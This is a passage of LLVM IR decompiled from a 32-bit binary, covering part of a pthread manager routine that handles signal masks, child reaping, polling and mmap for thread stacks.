  %v0_804b5f4 = phi i32 [ %v0_804b5e3, %dec_label_pc_804b5e3 ], [ %v2_804b5f0, %dec_label_pc_804b5ed ]
  store i32 %v0_804b5f4, i32* @esi, align 4
  %v12_804b662 = icmp eq i32 %v0_804b5f4, %v0_804b5e3
  %v1_804b664 = icmp eq i1 %v12_804b662, false
  br i1 %v1_804b664, label %dec_label_pc_804b5ed, label %dec_label_pc_804b666.loopexit

dec_label_pc_804b666.loopexit:                    ; preds = %dec_label_pc_804b662
  br label %dec_label_pc_804b666

dec_label_pc_804b666:                             ; preds = %dec_label_pc_804b666.loopexit, %dec_label_pc_804b641, %dec_label_pc_804b657
  %v0_804b666 = load i32, i32* @global_var_8062ea8.142, align 8
  %v1_804b666 = icmp eq i32 %v0_804b666, 0
  br i1 %v1_804b666, label %dec_label_pc_804b681, label %dec_label_pc_804b66f

dec_label_pc_804b66f:                             ; preds = %dec_label_pc_804b666
  %v0_804b66f = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  store i32 %v0_804b66f, i32* %edx.global-to-local, align 4
  store i32 %v0_804b66f, i32* @eax, align 4
  %v0_804b67c = call i32 @restart()
  br label %dec_label_pc_804b681

dec_label_pc_804b681:                             ; preds = %dec_label_pc_804b666, %dec_label_pc_804b66f
  %v3_804b681 = load i32, i32* %stack_var_-12, align 4
  %v1_804b687 = urem i32 %v3_804b681, 128
  %v1_804b68a = add nuw nsw i32 %v1_804b687, 1
  %v10_804b68a = trunc i32 %v1_804b68a to i8
  %tmp22 = icmp slt i8 %v10_804b68a, 2
  br i1 %tmp22, label %dec_label_pc_804b6aa, label %dec_label_pc_804b691

dec_label_pc_804b691:                             ; preds = %dec_label_pc_804b681
  store i32 %v1_804b687, i32* @ecx, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v1_804b687, i32* @eax, align 4
  %v0_804b69b = call i32 @pthread_kill_all_threads()
  %v1_804b6a5 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b6aa:                             ; preds = %dec_label_pc_804b681, %entry
  %v3_804b6b7 = call i32 @__libc_waitpid(i32 -1, i32 %v2_804b6b0, i32 -2147483647)
  %tmp23 = icmp slt i32 %v3_804b6b7, 1
  %tmp24 = icmp eq i1 %tmp23, false
  br i1 %tmp24, label %dec_label_pc_804b5e3, label %dec_label_pc_804b6c7

dec_label_pc_804b6c7:                             ; preds = %dec_label_pc_804b6aa
  %v2_804b6ca = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b6ca, i32* @ebx, align 4
  store i32 %v0_804b5d9, i32* @esi, align 4
  ret i32 %v3_804b6b7

; uselistorder directives
  uselistorder i32 %v3_804b6b7, { 0, 2, 1 }
  uselistorder i32 %v1_804b687, { 1, 2, 0 }
  uselistorder i32 %v0_804b5f4, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_804b644, { 1, 0 }
  uselistorder i32 %v0_804b630, { 1, 0 }
  uselistorder i32 %v2_804b5f0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b681, { 1, 0 }
  uselistorder label %dec_label_pc_804b666, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804b641, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b6cd = load i32, i32* @ebp, align 4
  %v0_804b6ce = load i32, i32* @edi, align 4
  %v0_804b6cf = load i32, i32* @esi, align 4
  %v0_804b6d0 = load i32, i32* @ebx, align 4
  store i32 %v0_804b6d0, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_8062548.151 to i32), i32* bitcast (i32** @global_var_8062544.152 to i32*), align 4
  store i32 ptrtoint (i32* @global_var_8062550.154 to i32), i32* @global_var_806254c.153, align 4
  %v2_804b6eb = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_804b6eb, i32* @ebx, align 4
  store i32 %v2_804b6eb, i32* %stack_var_-364, align 4
  %v1_804b6f3 = call i32 @sigfillset(i32 %v2_804b6eb)
  store i32 %v1_804b6f3, i32* %eax.global-to-local, align 4
  %v0_804b6fa = load i32, i32* @global_var_80626ec.155, align 4
  store i32 %v2_804b6eb, i32* %stack_var_-364, align 4
  %v1_804b701 = call i32 @__GI_sigdelset(i32 %v2_804b6eb)
  store i32 %v1_804b701, i32* %eax.global-to-local, align 4
  store i32 %v2_804b6eb, i32* %ecx.global-to-local, align 4
  store i32 %v0_804b6fa, i32* @esi, align 4
  store i32 %v2_804b6eb, i32* %stack_var_-364, align 4
  %v1_804b70b = call i32 @__GI_sigdelset(i32 %v2_804b6eb)
  %v0_804b710 = load i32, i32* @global_var_8067660.145, align 32
  store i32 %v0_804b710, i32* %eax.global-to-local, align 4
  %v1_804b718 = icmp eq i32 %v0_804b710, 0
  br i1 %v1_804b718, label %dec_label_pc_804b731, label %dec_label_pc_804b71c

dec_label_pc_804b71c:                             ; preds = %entry
  %v0_804b71c = load i32, i32* @global_var_80626f0.146, align 16
  store i32 %v0_804b71c, i32* %eax.global-to-local, align 4
  %tmp48 = icmp slt i32 %v0_804b71c, 1
  br i1 %tmp48, label %dec_label_pc_804b731, label %dec_label_pc_804b725

dec_label_pc_804b725:                             ; preds = %dec_label_pc_804b71c
  store i32 %v2_804b6eb, i32* %stack_var_-364, align 4
  %v1_804b729 = call i32 @__GI_sigdelset(i32 %v2_804b6eb)
  store i32 %v1_804b729, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b731

dec_label_pc_804b731:                             ; preds = %dec_label_pc_804b71c, %entry, %dec_label_pc_804b725
  store i32 %v2_804b6eb, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-364, align 4
  %v3_804b73e = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_804b73e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804b73e, i32 0)
  %v0_804b743 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  store i32 %v0_804b743, i32* %eax.global-to-local, align 4
  store i32 2, i32* @edi, align 4
  %v3_804b749 = load i32, i32* @global_var_80626f8.156, align 4
  store i32 %v3_804b749, i32* %stack_var_-364, align 4
  %v1_804b74c = call i32 @__pthread_manager_adjust_prio(i32 %v3_804b749)
  store i32 %v1_804b74c, i32* %eax.global-to-local, align 4
  %v2_804b75a = ptrtoint i32* %stack_var_-300 to i32
  br label %dec_label_pc_804b754

dec_label_pc_804b754:                             ; preds = %dec_label_pc_804b771, %dec_label_pc_804b731
  store i32 %v2_804b75a, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-364, align 4
  %v3_804b766 = call i32 @__libc_read(i32 %arg1, i32 %v2_804b75a, i32 148)
  %v1_804b76e = add i32 %v3_804b766, 1
  %v8_804b76e = icmp eq i32 %v1_804b76e, 0
  store i32 %v1_804b76e, i32* %eax.global-to-local, align 4
  %v1_804b76f = icmp eq i1 %v8_804b76e, false
  br i1 %v1_804b76f, label %dec_label_pc_804b77b, label %dec_label_pc_804b771

dec_label_pc_804b771:                             ; preds = %dec_label_pc_804b754
  %v0_804b771 = load i32, i32* %stack_var_-364, align 4
  %v1_804b771 = call i32 @__errno_location(i32 %v0_804b771)
  store i32 %v1_804b771, i32* %eax.global-to-local, align 4
  %v1_804b776 = inttoptr i32 %v1_804b771 to i32*
  %v2_804b776 = load i32, i32* %v1_804b776, align 4
  %v11_804b776 = icmp eq i32 %v2_804b776, 4
  br i1 %v11_804b776, label %dec_label_pc_804b754, label %dec_label_pc_804b77b

dec_label_pc_804b77b:                             ; preds = %dec_label_pc_804b771, %dec_label_pc_804b754
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_804bc5f = inttoptr i32 %arg1 to i32*
  %v4_804b981 = inttoptr i32 %arg1 to i8*
  %v4_804baa6 = inttoptr i32 %arg1 to i16*
  br label %dec_label_pc_804b793thread-pre-split

dec_label_pc_804b793thread-pre-split:             ; preds = %dec_label_pc_804bceb, %dec_label_pc_804b7dd, %dec_label_pc_804b7e0, %dec_label_pc_804b77b
  %v1_804b793.pr = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b793

dec_label_pc_804b793:                             ; preds = %dec_label_pc_804b7ea, %dec_label_pc_804bd26, %dec_label_pc_804b793thread-pre-split
  %v1_804b793 = phi i32 [ %v1_804b793.pr, %dec_label_pc_804b793thread-pre-split ], [ %v1_804b801, %dec_label_pc_804b7ea ], [ %v1_804bd26, %dec_label_pc_804bd26 ]
  %v0_804b793 = load i32, i32* @ebx, align 4
  %v2_804b793 = add i32 %v1_804b793, -4
  %v3_804b793 = inttoptr i32 %v2_804b793 to i32*
  store i32 %v0_804b793, i32* %v3_804b793, align 4
  %v1_804b794 = add i32 %v1_804b793, -8
  %v2_804b794 = inttoptr i32 %v1_804b794 to i32*
  store i32 2000, i32* %v2_804b794, align 4
  %v1_804b799 = add i32 %v1_804b793, -12
  %v2_804b799 = inttoptr i32 %v1_804b799 to i32*
  store i32 1, i32* %v2_804b799, align 4
  %v1_804b79b = add i32 %v1_804b793, 324
  store i32 %v1_804b79b, i32* %eax.global-to-local, align 4
  %v2_804b7a2 = add i32 %v1_804b793, -16
  %v3_804b7a2 = inttoptr i32 %v2_804b7a2 to i32*
  store i32 %v1_804b79b, i32* %v3_804b7a2, align 4
  %v0_804b7a3 = call i32 @__libc_poll()
  store i32 %v0_804b7a3, i32* %eax.global-to-local, align 4
  store i32 %v0_804b7a3, i32* @ebx, align 4
  %v1_804b7aa = call i32 @getppid(i32 %arg1)
  store i32 %v1_804b7aa, i32* %eax.global-to-local, align 4
  %v9_804b7b2 = icmp eq i32 %v1_804b7aa, 1
  %v1_804b7b5 = icmp eq i1 %v9_804b7b2, false
  br i1 %v1_804b7b5, label %dec_label_pc_804b7c5, label %dec_label_pc_804b7b7

dec_label_pc_804b7b7:                             ; preds = %dec_label_pc_804b793
  store i32 0, i32* @edx, align 4
  %v1_804b7b9 = and i32 %v1_804b7aa, -256
  %v2_804b7b9 = or i32 %v1_804b7b9, 9
  store i32 %v2_804b7b9, i32* @eax, align 4
  %v0_804b7bb = call i32 @pthread_kill_all_threads()
  br label %dec_label_pc_804bcc1

dec_label_pc_804b7c5:                             ; preds = %dec_label_pc_804b793
  %v0_804b7c5 = load i32, i32* @global_var_8062ea4.141, align 4
  store i32 %v0_804b7c5, i32* %eax.global-to-local, align 4
  %v1_804b7ca = icmp eq i32 %v0_804b7c5, 0
  br i1 %v1_804b7ca, label %dec_label_pc_804b7dd, label %dec_label_pc_804b7ce

dec_label_pc_804b7ce:                             ; preds = %dec_label_pc_804b7c5
  store i32 0, i32* @global_var_8062ea4.141, align 4
  %v0_804b7d8 = call i32 @pthread_reap_children()
  store i32 %v0_804b7d8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b7dd

dec_label_pc_804b7dd:                             ; preds = %dec_label_pc_804b7c5, %dec_label_pc_804b7ce
  %v0_804b7dd = load i32, i32* @ebx, align 4
  %v1_804b7dd = add i32 %v0_804b7dd, -1
  %v8_804b7dd = icmp eq i32 %v1_804b7dd, 0
  store i32 %v1_804b7dd, i32* @ebx, align 4
  %v1_804b7de = icmp eq i1 %v8_804b7dd, false
  br i1 %v1_804b7de, label %dec_label_pc_804b793thread-pre-split, label %dec_label_pc_804b7e0

dec_label_pc_804b7e0:                             ; preds = %dec_label_pc_804b7dd
  %v0_804b7e0 = load i32, i32* @esp, align 4
  %v1_804b7e0 = add i32 %v0_804b7e0, 330
  %v2_804b7e0 = inttoptr i32 %v1_804b7e0 to i8*
  %v3_804b7e0 = load i8, i8* %v2_804b7e0, align 1
  %v4_804b7e0 = urem i8 %v3_804b7e0, 2
  %v5_804b7e0 = icmp eq i8 %v4_804b7e0, 0
  br i1 %v5_804b7e0, label %dec_label_pc_804b793thread-pre-split, label %dec_label_pc_804b7ea

dec_label_pc_804b7ea:                             ; preds = %dec_label_pc_804b7e0
  %v0_804b7ea = load i32, i32* @ecx, align 4
  %v2_804b7ea = add i32 %v0_804b7e0, -4
  %v3_804b7ea = inttoptr i32 %v2_804b7ea to i32*
  store i32 %v0_804b7ea, i32* %v3_804b7ea, align 4
  %v1_804b7eb = add i32 %v0_804b7e0, -8
  %v2_804b7eb = inttoptr i32 %v1_804b7eb to i32*
  store i32 148, i32* %v2_804b7eb, align 4
  %v1_804b7f0 = add i32 %v0_804b7e0, 48
  store i32 %v1_804b7f0, i32* %ecx.global-to-local, align 4
  %v2_804b7f4 = add i32 %v0_804b7e0, -12
  %v3_804b7f4 = inttoptr i32 %v2_804b7f4 to i32*
  store i32 %v1_804b7f0, i32* %v3_804b7f4, align 4
  %v1_804b7f5 = add i32 %v0_804b7e0, 352
  %v2_804b7f5 = inttoptr i32 %v1_804b7f5 to i32*
  %v3_804b7f5 = load i32, i32* %v2_804b7f5, align 4
  %v5_804b7f5 = add i32 %v0_804b7e0, -16
  %v6_804b7f5 = inttoptr i32 %v5_804b7f5 to i32*
  store i32 %v3_804b7f5, i32* %v6_804b7f5, align 4
  %v2_804b7fc = load i32, i32* %stack_var_-16, align 4
  %v4_804b7fc = call i32 @__libc_read(i32 %arg1, i32 1, i32 %v2_804b7fc)
  store i32 %v4_804b7fc, i32* %eax.global-to-local, align 4
  %v0_804b801 = load i32, i32* @esp, align 4
  %v1_804b801 = add i32 %v0_804b801, 16
  %v1_804b804 = add i32 %v0_804b801, 68
  %v2_804b804 = inttoptr i32 %v1_804b804 to i32*
  %v3_804b804 = load i32, i32* %v2_804b804, align 4
  store i32 %v3_804b804, i32* %eax.global-to-local, align 4
  switch i32 %v1_804b793, label %dec_label_pc_804b793 [
    i32 0, label %dec_label_pc_804b816
    i32 1, label %dec_label_pc_804bc13
    i32 2, label %dec_label_pc_804bc69
    i32 3, label %dec_label_pc_804bccb
    i32 4, label %dec_label_pc_804bcf5
  ]

dec_label_pc_804b816:                             ; preds = %dec_label_pc_804b7ea
  %v1_804b816 = add i32 %v0_804b801, 64
  %v2_804b816 = inttoptr i32 %v1_804b816 to i32*
  %v3_804b816 = load i32, i32* %v2_804b816, align 4
  store i32 %v3_804b816, i32* %eax.global-to-local, align 4
  %v1_804b81a = add i32 %v0_804b801, 72
  %v2_804b81a = inttoptr i32 %v1_804b81a to i32*
  %v3_804b81a = load i32, i32* %v2_804b81a, align 4
  store i32 %v3_804b81a, i32* @edi, align 4
  %v2_804b81e = add i32 %v0_804b801, 20
  %v3_804b81e = inttoptr i32 %v2_804b81e to i32*
  store i32 %v3_804b816, i32* %v3_804b81e, align 4
  %v0_804b822 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b822 = add i32 %v0_804b822, 412
  %v2_804b822 = inttoptr i32 %v1_804b822 to i32*
  %v3_804b822 = load i32, i32* %v2_804b822, align 4
  store i32 %v3_804b822, i32* %edx.global-to-local, align 4
  %v1_804b828 = load i32, i32* @esp, align 4
  %v2_804b828 = add i32 %v1_804b828, 24
  %v3_804b828 = inttoptr i32 %v2_804b828 to i32*
  store i32 %v3_804b822, i32* %v3_804b828, align 4
  %v0_804b82c = load i32, i32* @esp, align 4
  %v1_804b82c = add i32 %v0_804b82c, 60
  %v2_804b82c = inttoptr i32 %v1_804b82c to i32*
  %v3_804b82c = load i32, i32* %v2_804b82c, align 4
  store i32 %v3_804b82c, i32* %edx.global-to-local, align 4
  %v0_804b830 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b830 = add i32 %v0_804b830, 20
  %v2_804b830 = inttoptr i32 %v1_804b830 to i32*
  %v3_804b830 = load i32, i32* %v2_804b830, align 4
  store i32 %v3_804b830, i32* %ecx.global-to-local, align 4
  %v1_804b833 = add i32 %v0_804b82c, 64
  %v2_804b833 = inttoptr i32 %v1_804b833 to i32*
  %v3_804b833 = load i32, i32* %v2_804b833, align 4
  store i32 %v3_804b833, i32* %eax.global-to-local, align 4
  %v2_804b837 = add i32 %v0_804b82c, 28
  %v3_804b837 = inttoptr i32 %v2_804b837 to i32*
  store i32 %v3_804b830, i32* %v3_804b837, align 4
  %v0_804b83b = load i32, i32* %eax.global-to-local, align 4
  %v1_804b83b = load i32, i32* @esp, align 4
  %v2_804b83b = add i32 %v1_804b83b, 32
  %v3_804b83b = inttoptr i32 %v2_804b83b to i32*
  store i32 %v0_804b83b, i32* %v3_804b83b, align 4
  %v0_804b83f = load i32, i32* %edx.global-to-local, align 4
  %v1_804b83f = load i32, i32* @esp, align 4
  %v2_804b83f = add i32 %v1_804b83f, 36
  %v3_804b83f = inttoptr i32 %v2_804b83f to i32*
  store i32 %v0_804b83f, i32* %v3_804b83f, align 4
  %v1_804b843 = call i32 @__GI_getpagesize(i32 %arg1)
  store i32 %v1_804b843, i32* %eax.global-to-local, align 4
  %v0_804b848 = load i32, i32* @edi, align 4
  %v1_804b848 = icmp eq i32 %v0_804b848, 0
  store i32 %v1_804b843, i32* @ebp, align 4
  br i1 %v1_804b848, label %dec_label_pc_804b866, label %dec_label_pc_804b84e

dec_label_pc_804b84e:                             ; preds = %dec_label_pc_804b816
  %v1_804b84e = add i32 %v0_804b848, 4
  %v2_804b84e = inttoptr i32 %v1_804b84e to i32*
  %v3_804b84e = load i32, i32* %v2_804b84e, align 4
  %v4_804b84e = icmp eq i32 %v3_804b84e, 0
  br i1 %v4_804b84e, label %dec_label_pc_804b866, label %dec_label_pc_804b854

dec_label_pc_804b854:                             ; preds = %dec_label_pc_804b84e
  %v0_804b854 = call i32 @geteuid()
  store i32 %v0_804b854, i32* %eax.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v1_804b85e = icmp eq i32 %v0_804b854, 0
  %v1_804b860 = icmp eq i1 %v1_804b85e, false
  br i1 %v1_804b860, label %dec_label_pc_804bc03, label %dec_label_pc_804b866

dec_label_pc_804b866:                             ; preds = %dec_label_pc_804b854, %dec_label_pc_804b84e, %dec_label_pc_804b816
  %v0_804b866 = load i32, i32* @esp, align 4
  %v1_804b866 = add i32 %v0_804b866, 20
  %v2_804b866 = inttoptr i32 %v1_804b866 to i32*
  store i32 2, i32* %v2_804b866, align 4
  %v0_804b86e81 = load i32, i32* @esp, align 4
  %v1_804b86e82 = add i32 %v0_804b86e81, 20
  %v2_804b86e83 = inttoptr i32 %v1_804b86e82 to i32*
  %v3_804b86e84 = load i32, i32* %v2_804b86e83, align 4
  %tmp103 = icmp ult i32 %v3_804b86e84, 1024
  br i1 %tmp103, label %dec_label_pc_804b87c, label %dec_label_pc_804bbec

dec_label_pc_804b87c:                             ; preds = %dec_label_pc_804b866, %dec_label_pc_804b96f
  %v3_804b86e91 = phi i32 [ %v3_804b86e, %dec_label_pc_804b96f ], [ %v3_804b86e84, %dec_label_pc_804b866 ]
  %v0_804b86e90 = phi i32 [ %v0_804b86e, %dec_label_pc_804b96f ], [ %v0_804b86e81, %dec_label_pc_804b866 ]
  %v2_804b880 = mul i32 %v3_804b86e91, 16
  store i32 %v2_804b880, i32* %eax.global-to-local, align 4
  %v1_804b883 = add i32 %v2_804b880, 134603528
  %v2_804b883 = inttoptr i32 %v1_804b883 to i32*
  %v3_804b883 = load i32, i32* %v2_804b883, align 8
  %v4_804b883 = icmp eq i32 %v3_804b883, 0
  %v1_804b88a = icmp eq i1 %v4_804b883, false
  br i1 %v1_804b88a, label %dec_label_pc_804b96f, label %dec_label_pc_804b890

dec_label_pc_804b890:                             ; preds = %dec_label_pc_804b87c
  %v0_804b890 = load i32, i32* @global_var_8062fec.134, align 4
  store i32 %v0_804b890, i32* %ecx.global-to-local, align 4
  %v0_804b896 = load i32, i32* @edi, align 4
  %v1_804b896 = icmp eq i32 %v0_804b896, 0
  br i1 %v1_804b896, label %dec_label_pc_804b8c2, label %dec_label_pc_804b89a

dec_label_pc_804b89a:                             ; preds = %dec_label_pc_804b890
  %v1_804b89a = add i32 %v0_804b896, 24
  %v2_804b89a = inttoptr i32 %v1_804b89a to i32*
  %v3_804b89a = load i32, i32* %v2_804b89a, align 4
  %v4_804b89a = icmp eq i32 %v3_804b89a, 0
  br i1 %v4_804b89a, label %dec_label_pc_804b8c2, label %dec_label_pc_804b8a0

dec_label_pc_804b8a0:                             ; preds = %dec_label_pc_804b89a
  %v1_804b8a0 = add i32 %v0_804b896, 28
  %v2_804b8a0 = inttoptr i32 %v1_804b8a0 to i32*
  %v3_804b8a0 = load i32, i32* %v2_804b8a0, align 4
  store i32 %v3_804b8a0, i32* %edx.global-to-local, align 4
  %v1_804b8a7 = and i32 %v3_804b8a0, -4
  store i32 %v1_804b8a7, i32* %eax.global-to-local, align 4
  %v2_804b8aa = add i32 %v0_804b896, 32
  %v3_804b8aa = inttoptr i32 %v2_804b8aa to i32*
  %v4_804b8aa = load i32, i32* %v3_804b8aa, align 4
  %v5_804b8aa = sub i32 %v3_804b8a0, %v4_804b8aa
  store i32 %v5_804b8aa, i32* @ebp, align 4
  %v1_804b8ad = add i32 %v1_804b8a7, -480
  store i32 %v1_804b8ad, i32* @esi, align 4
  store i32 1, i32* @global_var_8067650.138, align 16
  br label %dec_label_pc_804b95d

dec_label_pc_804b8c2:                             ; preds = %dec_label_pc_804b89a, %dec_label_pc_804b890
  %v1_804b8c2 = add i32 %v0_804b86e90, 40
  %v2_804b8c2 = inttoptr i32 %v1_804b8c2 to i32*
  store i32 2097152, i32* %v2_804b8c2, align 4
  %v0_804b8ca = load i32, i32* @esp, align 4
  %v1_804b8ca = add i32 %v0_804b8ca, 40
  %v2_804b8ca = inttoptr i32 %v1_804b8ca to i32*
  %v3_804b8ca = load i32, i32* %v2_804b8ca, align 4
  %v4_804b8ca = load i32, i32* @ebp, align 4
  %v5_804b8ca = sub i32 %v3_804b8ca, %v4_804b8ca
  store i32 %v5_804b8ca, i32* %v2_804b8ca, align 4
  %v0_804b8ce = load i32, i32* @edi, align 4
  %v1_804b8ce = icmp eq i32 %v0_804b8ce, 0
  br i1 %v1_804b8ce, label %dec_label_pc_804b8c2.dec_label_pc_804b8e7_crit_edge, label %dec_label_pc_804b8d2

dec_label_pc_804b8c2.dec_label_pc_804b8e7_crit_edge: ; preds = %dec_label_pc_804b8c2
  %v0_804b8e7.pre = load i32, i32* @esp, align 4
  %v0_804b8f3.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804b8e7

dec_label_pc_804b8d2:                             ; preds = %dec_label_pc_804b8c2
  %v0_804b8d2 = load i32, i32* @ebp, align 4
  store i32 %v0_804b8d2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804b8d6 = add i32 %v0_804b8ce, 32
  %v3_804b8d6 = inttoptr i32 %v2_804b8d6 to i32*
  %v4_804b8d6 = load i32, i32* %v3_804b8d6, align 4
  %v5_804b8d6 = add i32 %v0_804b8d2, -1
  %v1_804b8d9 = add i32 %v5_804b8d6, %v4_804b8d6
  %tmp49 = urem i32 %v1_804b8d9, %v0_804b8d2
  store i32 %tmp49, i32* @edx, align 4
  %v4_804b8dc = sub i32 %v1_804b8d9, %tmp49
  store i32 %v4_804b8dc, i32* %eax.global-to-local, align 4
  store i32 %v4_804b8dc, i32* @ebx, align 4
  %v0_804b8e1 = load i32, i32* @esp, align 4
  %v1_804b8e1 = add i32 %v0_804b8e1, 40
  %v2_804b8e1 = inttoptr i32 %v1_804b8e1 to i32*
  %v3_804b8e1 = load i32, i32* %v2_804b8e1, align 4
  %v10_804b8e1 = icmp ult i32 %v3_804b8e1, %v4_804b8dc
  %v1_804b8e5 = icmp eq i1 %v10_804b8e1, false
  br i1 %v1_804b8e5, label %dec_label_pc_804b8eb, label %dec_label_pc_804b8e7

dec_label_pc_804b8e7:                             ; preds = %dec_label_pc_804b8c2.dec_label_pc_804b8e7_crit_edge, %dec_label_pc_804b8d2
  %v0_804b8f3.pre = phi i32 [ %v0_804b8f3.pre.pre, %dec_label_pc_804b8c2.dec_label_pc_804b8e7_crit_edge ], [ %tmp49, %dec_label_pc_804b8d2 ]
  %v0_804b8e7 = phi i32 [ %v0_804b8e7.pre, %dec_label_pc_804b8c2.dec_label_pc_804b8e7_crit_edge ], [ %v0_804b8e1, %dec_label_pc_804b8d2 ]
  %v1_804b8e7 = add i32 %v0_804b8e7, 40
  %v2_804b8e7 = inttoptr i32 %v1_804b8e7 to i32*
  %v3_804b8e7 = load i32, i32* %v2_804b8e7, align 4
  store i32 %v3_804b8e7, i32* @ebx, align 4
  br label %dec_label_pc_804b8eb

dec_label_pc_804b8eb:                             ; preds = %dec_label_pc_804b8d2, %dec_label_pc_804b8e7
  %v0_804b8f3 = phi i32 [ %tmp49, %dec_label_pc_804b8d2 ], [ %v0_804b8f3.pre, %dec_label_pc_804b8e7 ]
  %v1_804b8f3 = phi i32 [ %v0_804b8e1, %dec_label_pc_804b8d2 ], [ %v0_804b8e7, %dec_label_pc_804b8e7 ]
  %v2_804b8eb = add i32 %v1_804b8f3, 20
  %v3_804b8eb = inttoptr i32 %v2_804b8eb to i32*
  %v4_804b8eb = load i32, i32* %v3_804b8eb, align 4
  %v6_804b8eb = mul i32 %v4_804b8eb, -2097152
  store i32 %v6_804b8eb, i32* %eax.global-to-local, align 4
  %v2_804b8f3 = add i32 %v1_804b8f3, -4
  %v3_804b8f3 = inttoptr i32 %v2_804b8f3 to i32*
  store i32 %v0_804b8f3, i32* %v3_804b8f3, align 4
  %v0_804b8f4 = load i32, i32* @edx, align 4
  %v2_804b8f4 = add i32 %v1_804b8f3, -8
  %v3_804b8f4 = inttoptr i32 %v2_804b8f4 to i32*
  store i32 %v0_804b8f4, i32* %v3_804b8f4, align 4
  %v0_804b8f5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b8f5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b8f5 = add i32 %v0_804b8f5, 2096672
  %v3_804b8f5 = add i32 %v2_804b8f5, %v1_804b8f5
  store i32 %v3_804b8f5, i32* @esi, align 4
  %v0_804b8fc = load i32, i32* @global_var_80672b4.157, align 4
  %v2_804b901 = mul i32 %v0_804b8fc, 4
  store i32 %v2_804b901, i32* %eax.global-to-local, align 4
  %v2_804b906 = sub i32 %v3_804b8f5, %v2_804b901
  store i32 %v2_804b906, i32* %ecx.global-to-local, align 4
  %v1_804b908 = add i32 %v1_804b8f3, -12
  %v2_804b908 = inttoptr i32 %v1_804b908 to i32*
  store i32 0, i32* %v2_804b908, align 4
  %v1_804b90a = add i32 %v1_804b8f3, -16
  %v2_804b90a = inttoptr i32 %v1_804b90a to i32*
  store i32 -1, i32* %v2_804b90a, align 4
  %v1_804b90c = add i32 %v1_804b8f3, -20
  %v2_804b90c = inttoptr i32 %v1_804b90c to i32*
  store i32 306, i32* %v2_804b90c, align 4
  %v1_804b911 = add i32 %v1_804b8f3, -24
  %v2_804b911 = inttoptr i32 %v1_804b911 to i32*
  store i32 7, i32* %v2_804b911, align 4
  %v0_804b913 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b913 = add i32 %v1_804b8f3, -28
  %v3_804b913 = inttoptr i32 %v2_804b913 to i32*
  store i32 %v0_804b913, i32* %v3_804b913, align 4
  %v0_804b914 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b916 = add i32 %v0_804b914, 480
  store i32 %v1_804b916, i32* %eax.global-to-local, align 4
  %v2_804b91b = add i32 %v1_804b8f3, -32
  %v3_804b91b = inttoptr i32 %v2_804b91b to i32*
  store i32 %v1_804b916, i32* %v3_804b91b, align 4
  %v2_804b91c = load i32, i32* %stack_var_-16, align 4
  %v9_804b91c = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_804b91c, i32 %v0_804b6cf, i32 %v0_804b6ce, i32 %v0_804b6cd, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804b921 = load i32, i32* @esp, align 4
  %v1_804b921 = add i32 %v0_804b921, 32
  %v1_804b924 = add i32 %v9_804b91c, 1
  %v8_804b924 = icmp eq i32 %v1_804b924, 0
  store i32 %v1_804b924, i32* %eax.global-to-local, align 4
  br i1 %v8_804b924, label %dec_label_pc_804b96f, label %dec_label_pc_804b927

dec_label_pc_804b927:                             ; preds = %dec_label_pc_804b8eb
  %v0_804b927 = load i32, i32* @esi, align 4
  %v1_804b929 = load i32, i32* @ebx, align 4
  %v2_804b929 = sub i32 %v0_804b927, %v1_804b929
  store i32 %v2_804b929, i32* %eax.global-to-local, align 4
  %v2_804b92b = add i32 %v0_804b921, 72
  %v3_804b92b = inttoptr i32 %v2_804b92b to i32*
  %v4_804b92b = load i32, i32* %v3_804b92b, align 4
  %v15_804b92b = icmp eq i32 %v1_804b929, %v4_804b92b
  %v1_804b92f = add i32 %v2_804b929, 480
  store i32 %v1_804b92f, i32* @ebp, align 4
  br i1 %v15_804b92b, label %dec_label_pc_804b95d, label %dec_label_pc_804b937

dec_label_pc_804b937:                             ; preds = %dec_label_pc_804b927
  %v0_804b937 = load i32, i32* @edi, align 4
  %v1_804b937 = add i32 %v0_804b937, 20
  %v2_804b937 = inttoptr i32 %v1_804b937 to i32*
  %v3_804b937 = load i32, i32* %v2_804b937, align 4
  store i32 %v3_804b937, i32* %eax.global-to-local, align 4
  %v2_804b93c = sub i32 %v1_804b92f, %v3_804b937
  store i32 %v2_804b93c, i32* %edx.global-to-local, align 4
  %v2_804b93e = add i32 %v0_804b921, 40
  %v3_804b93e = inttoptr i32 %v2_804b93e to i32*
  store i32 %v3_804b937, i32* %v3_804b93e, align 4
